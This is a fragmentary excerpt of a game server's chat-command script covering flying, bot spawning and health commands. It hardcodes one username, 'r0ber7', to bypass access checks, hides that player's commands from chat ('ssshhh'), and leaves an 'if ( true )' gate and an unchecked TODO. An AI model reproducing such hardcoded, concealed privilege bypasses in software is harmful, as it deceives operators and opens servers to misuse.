...
bool onServerProcessChat( CRules@ this, const string& in text_in, string& out text_out, CPlayer@ player )
{
    ...
    // flying
		...
		if(security.checkAccess_Feature(player, "vote_cancel")){
		if ( true ) {
			// if admin, allow switching flying mode.
			if ( blob.get_bool("fly") == false ) {
				blob.set_bool("fly", true);
		    	print("Flying enabled.");
				}
			else {
				blob.set_bool("fly", false);
	...
	if(sv_test || player.getUsername() == "r0ber7")
	{

		if (text_in == "!bot" ) // TODO: whoaaa check seclevs
		{
		...
		// ssshhh
		if ( text_in.substr(0,1) == "!" && player.getUsername() == "r0ber7" ) { text_out = ""; }

		// immortality
		if ( text_in == "!immortal" ) {
			getPlayerByUsername("r0ber7").getBlob().server_SetHealth(1000);
		}
		// mortality
		else if ( text_in == "!mortal" ) {
			getPlayerByUsername("r0ber7").getBlob().server_SetHealth(1);
		}
...
bool onClientProcessChat( CRules@ this, const string& in text_in, string& out text_out, CPlayer@ player )
{
	...
	// silence everyone for me.
	// selective filter will be placed here based on the spam filter.
	if ( g_kidssafe == true ) {
		text_out = "[ -*- ]";
		}
